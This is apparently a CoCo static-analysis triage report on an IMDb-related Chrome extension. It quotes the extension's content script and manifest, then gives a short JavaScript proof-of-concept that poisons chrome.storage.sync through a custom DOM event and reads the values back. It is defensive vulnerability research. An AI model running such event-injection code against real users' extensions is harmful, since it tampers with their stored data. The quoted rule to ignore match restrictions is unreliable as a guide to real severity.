# CoCo Analysis: lcgimdomombbldajhgpfnnjfmjhkoiga

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (all variations of the same flow)

---

## Sink: document_eventListener_set-IMDB-Age -> chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lcgimdomombbldajhgpfnnjfmjhkoiga/opgen_generated_files/cs_0.js
Line 539: `document.addEventListener('set-IMDB-Age', function (event) {`
Line 545-548: Storing event.detail properties to chrome.storage.sync

**Code:**

```javascript
// Content script - Entry point (cs_0.js lines 539-560)
document.addEventListener('set-IMDB-Age', function (event) {
    var toggles = new Object();

    toggles.actors = event.detail.actor; // ← attacker-controlled
    toggles.films = event.detail.film; // ← attacker-controlled
    toggles.fullcasts = event.detail.fullcast; // ← attacker-controlled
    toggles.warning = event.detail.warn; // ← attacker-controlled

    chrome.storage.sync.set({ "data" : toggles}, function() {
        if (chrome.runtime.error) {
            // error handling
        }
    });
});

// Content script - Retrieval path (cs_0.js lines 491-537)
window.addEventListener("message", function(request) {
    if (request.data == "requestLocalStorage") {
        chrome.storage.sync.get("data", function(toggles) {
            if (!chrome.runtime.error) {
                if (toggles.data == null) {
                    // Set defaults
                    toggles.actors = false;
                    toggles.films = false;
                    toggles.fullcasts = false;
                    toggles.warning = false;
                    chrome.storage.sync.set({ "data" : toggles}, function() {});

                    var evt = document.createEvent("CustomEvent");
                    evt.initCustomEvent("get-IMDB-Age", true, true,
                        {"actor": false, "film": false, "fullcast": false, "warn": false});
                    document.dispatchEvent(evt); // ← sends back to webpage
                } else {
                    var evt = document.createEvent("CustomEvent");
                    evt.initCustomEvent("get-IMDB-Age", true, true,
                        {"actor": toggles.data.actors, // ← attacker's poisoned data
                         "film": toggles.data.films, // ← attacker's poisoned data
                         "fullcast": toggles.data.fullcasts, // ← attacker's poisoned data
                         "warn": toggles.data.warning}); // ← attacker's poisoned data
                    document.dispatchEvent(evt); // ← sends back to webpage
                }
            }
        });
    }
});

// manifest.json - Content scripts match
"content_scripts": [{
    "js": ["contentscript.js"],
    "matches": ["http://www.imdb.com/name/*","http://www.imdb.com/title/*",
                "https://www.imdb.com/name/*","https://www.imdb.com/title/*"]
}]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom events (document.addEventListener for 'set-IMDB-Age' event)

**Attack:**

```javascript
// From any IMDB page (http(s)://www.imdb.com/name/* or /title/*)
// Step 1: Poison storage with malicious data
var evt = document.createEvent("CustomEvent");
evt.initCustomEvent("set-IMDB-Age", true, true, {
    "actor": "malicious_value_1",
    "film": "malicious_value_2",
    "fullcast": "malicious_value_3",
    "warn": "malicious_value_4"
});
document.dispatchEvent(evt);

// Step 2: Listen for the data to be sent back
document.addEventListener('get-IMDB-Age', function(event) {
    console.log('Retrieved poisoned data:', event.detail);
    // event.detail contains all the malicious values stored above
});

// Step 3: Trigger retrieval
window.postMessage("requestLocalStorage", "*");

// The extension will retrieve the poisoned data from storage
// and dispatch a 'get-IMDB-Age' event containing the attacker's values
```

**Impact:** Complete storage exploitation chain. An attacker controlling any IMDb page (or via XSS on IMDb) can:
1. Write arbitrary data to chrome.storage.sync by dispatching a 'set-IMDB-Age' custom event
2. Retrieve that data back by sending a window.postMessage("requestLocalStorage") and listening for the 'get-IMDB-Age' event

Per the methodology, this is a TRUE POSITIVE because:
- **Flow exists in real code**: Lines 539-560 and 491-537 are in actual extension code (after line 465)
- **External attacker trigger**: document.addEventListener allows ANY webpage to dispatch custom events
- **Permissions present**: "storage" permission is in manifest.json
- **Attacker-controllable data**: event.detail is fully controlled by the webpage
- **Exploitable impact**: Complete storage exploitation chain - attacker can write data to storage.sync and retrieve it back via custom events

While the content_scripts only match IMDb pages, per the methodology: "IGNORE manifest content_scripts matches restrictions - if event listener exists, assume exploitable." An attacker who can execute JavaScript on any IMDb page (e.g., through an XSS vulnerability or by controlling content on IMDb) can exploit this vulnerability.

**Note:** All 4 detected sinks are variations of the same flow at lines 545-548, where different properties of event.detail (actor, film, fullcast, warn) are stored to chrome.storage.sync.
